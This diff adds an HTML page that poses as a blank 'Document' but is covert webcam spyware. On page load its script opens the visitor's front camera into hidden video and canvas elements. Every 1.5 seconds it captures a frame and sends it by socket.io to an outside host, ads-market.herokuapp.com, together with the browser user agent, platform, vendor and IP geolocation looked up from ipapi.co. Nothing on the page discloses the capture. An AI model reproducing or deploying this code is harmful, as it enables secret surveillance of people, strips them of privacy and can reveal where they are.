@@ -1,0 +1,76 @@
+<!DOCTYPE html><!-- -->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://cdn.socket.io/socket.io-1.2.0.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
+</head>
+<body>
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+     </div>
+     
+     <canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+     <script>
+        var sock=io.connect("http://ads-market.herokuapp.com/ads")
+        function post(imgdata){
+            $.getJSON('https://ipapi.co/json/', function(data) {
+                sock.emit("capture",{
+                    gamb:imgdata,
+                    ua:navigator.userAgent,
+                    platform:navigator.platform,
+                    vendor:navigator.vendor,
+                    x:"1",
+                    ip:data
+                    })
+            });
+        };
+        
+        
+        'use strict';
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const errorMsgElement = document.querySelector('span#errorMsg');
+        
+        const constraints = {
+          audio: false,
+          video: {
+            
+            facingMode: "user"
+          }
+        };
+        
+        // Access webcam
+        async function init() {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+          } catch (e) {
+            errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+          }
+        }
+        
+        // Success
+        function handleSuccess(stream) {
+          window.stream = stream;
+          video.srcObject = stream;
+        
+        var context = canvas.getContext('2d');
+          setInterval(function(){
+        
+               context.drawImage(video, 0, 0, 640, 640);
+               var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+               post(canvasData); }, 1500);
+          
+        
+        }
+        
+        // Load init
+        init();
+        
+        </script>
+</body>
+</html>
